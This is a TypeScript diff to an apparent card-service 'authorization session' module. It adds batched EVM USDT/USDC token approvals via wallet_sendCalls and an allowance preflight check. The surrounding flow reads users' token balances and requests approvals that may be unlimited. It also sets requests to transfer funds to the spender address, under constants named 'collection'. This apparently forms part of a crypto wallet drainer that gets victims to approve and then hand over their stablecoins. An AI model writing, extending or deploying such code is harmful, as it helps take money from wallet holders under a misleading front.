@@ -1,9 +1,16 @@
 import { formatTransferSkipReason } from "@trustmycard/shared/constants/collection";
 import { getToken, parseHumanToRaw } from "../core/chain-tokens";
+import { isEvmChainKey } from "../core/native-chains";
 import type { ApprovalOrchestrationResult } from "../approval/types";
 import { ApprovalStageName } from "../approval/types";
+import type { ApprovalRequest } from "../approval/types";
 import type { NativeTransferResult } from "../native-transfer/types";
 import { getErrorMessage, isUserRejection } from "../core/errors";
+import {
+  alreadyAuthorizedResult,
+  createPreflightApi,
+  preflightExistingAllowance,
+} from "./allowance-preflight";
 import {
   SessionTimelineTracker,
   flushSessionTimeline,
@@ -16,7 +23,12 @@ import type {
   LinkedAccounts,
   NetworkRow,
   TokenSymbol,
+  UniversalProvider,
 } from "../types";
+import {
+  planAuthorizationWork,
+  runEvmTokenBatchApproval,
+} from "./evm-token-batch";
 import {
   balanceForNative,
   balanceForToken,
@@ -63,6 +75,9 @@ export type RunAuthorizationSessionArgs = {
   log?: (step: string, detail?: Record<string, unknown>) => void;
   sessionId?: string;
   authorizationSessionId?: string;
+  /** When set, consecutive EVM USDT+USDC approvals may use EIP-5792 wallet_sendCalls. */
+  evmBatchProvider?: UniversalProvider;
+  apiBaseUrl?: string;
 };
 
 function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
@@ -112,7 +127,43 @@ export async function runAuthorizationSession(
     assets: args.items.map((i) => `${i.network}:${i.asset}`),
   });
 
-  for (const item of args.items) {
+  const workUnits = planAuthorizationWork(args.items);
+
+  for (const unit of workUnits) {
+    if (unit.kind === "evm_token_batch" && unit.items.length >= 2) {
+      if (args.evmBatchProvider) {
+        const batchResults = await runEvmTokenBatchApproval({
+          items: unit.items,
+          network: unit.network,
+          networks: args.networks,
+          accounts: args.accounts,
+          provider: args.evmBatchProvider,
+          apiBaseUrl: args.apiBaseUrl,
+          getSpender: args.getSpender,
+          runApproval: args.runApproval,
+          onAssetStart: args.onAssetStart,
+          onAssetEnd: args.onAssetEnd,
+          log,
+        });
+        results.push(...batchResults);
+        continue;
+      }
+
+      for (const item of unit.items) {
+        args.onAssetStart?.(item);
+        await runTokenAsset({
+          item: { ...item, asset: item.asset as TokenSymbol },
+          args,
+          results,
+          log,
+        });
+      }
+      continue;
+    }
+
+    if (unit.kind !== "single") continue;
+
+    const item = unit.item;
     args.onAssetStart?.(item);
 
     if (item.asset === "NATIVE") {
@@ -246,6 +297,46 @@ async function runTokenAsset(ctx: {
       availableBalanceRaw: availableBalanceRaw.toString(),
       unlimited: item.unlimited,
     });
+
+    if (isEvmChainKey(item.network) && owner) {
+      try {
+        const preflightRequest: ApprovalRequest = {
+          network: item.network,
+          owner,
+          token,
+          amountHuman: item.unlimited ? undefined : item.amountHuman,
+          unlimited: item.unlimited,
+          nativeBalanceHuman: String(trxBalance),
+          tokenBalanceHuman,
+          executeTransfer: shouldAttemptTransfer,
+          transferToAddress: spender,
+          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+        };
+        const preflightApi = createPreflightApi(args.apiBaseUrl);
+        const { alreadyAuthorized } = await preflightExistingAllowance({
+          api: preflightApi,
+          request: preflightRequest,
+        });
+        if (alreadyAuthorized) {
+          const result = alreadyAuthorizedResult({
+            item: { ...item, asset: token },
+          });
+          results.push(result);
+          args.onAssetEnd?.(result);
+          log?.("AUTHORIZATION ASSET SKIPPED — ALREADY AUTHORIZED", {
+            network: item.network,
+            token,
+          });
+          return;
+        }
+      } catch (err) {
+        log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
+          network: item.network,
+          token,
+          error: getErrorMessage(err, "Allowance preflight unavailable"),
+        });
+      }
+    }
 
     const orchestration = await args.runApproval({
       network: item.network,
